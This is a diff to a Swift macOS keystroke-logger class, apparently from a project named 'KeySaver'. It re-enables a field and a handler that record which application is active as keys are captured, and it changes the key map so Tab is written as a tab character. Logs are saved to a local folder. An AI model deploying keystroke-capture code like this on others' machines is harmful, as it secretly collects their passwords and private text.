@@ -17,7 +17,7 @@ class Keylogger
     //    var bundlePathURL = Bundle.main.bundleURL   // Path to where the executable is present - Change this to use custom path
     static var bundlePathURL = URL(fileURLWithPath: "/Users/etiennebeaulac/Downloads", isDirectory: true)
     static var keylogs = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Logs")
-//    var appName = "KeySaver"                    // Active App name, starts with this one
+    var appName = "KeySaver"                    // Active App name, starts with this one
 //    var keylogs: URL                            // Folder
     
     init()
@@ -65,16 +65,15 @@ class Keylogger
         
     }
     
-//    @objc dynamic func activatedApp(notification: NSNotification)
-//    {
-//        if  let info = notification.userInfo,
-//            let app = info[NSWorkspace.applicationUserInfoKey] as? NSRunningApplication,
-//            let name = app.localizedName,
-//            let icon = app.icon
-//        {
-//            self.appName = name
-//        }
-//    }
+    @objc dynamic func activatedApp(notification: NSNotification)
+    {
+        if  let info = notification.userInfo,
+            let app = info[NSWorkspace.applicationUserInfoKey] as? NSRunningApplication,
+            let name = app.localizedName
+        {
+            self.appName = name
+        }
+    }
     
     /* For Keyboard */
     func CreateDeviceMatchingDictionary(inUsagePage: Int ,inUsage: Int ) -> CFMutableDictionary
@@ -146,7 +145,7 @@ class Keylogger
         map[40] = ["\n","\n"]
         map[41] = ["\\ESCAPE","\\ESCAPE"]
         map[42] = ["\\DELETE|BACKSPACE","\\DELETE|BACKSPACE"] //
-        map[43] = ["\\TAB","\\TAB"]
+        map[43] = ["\t","\t"]
         map[44] = [" "," "]
         map[45] = ["-","_"]
         map[46] = ["=","+"]
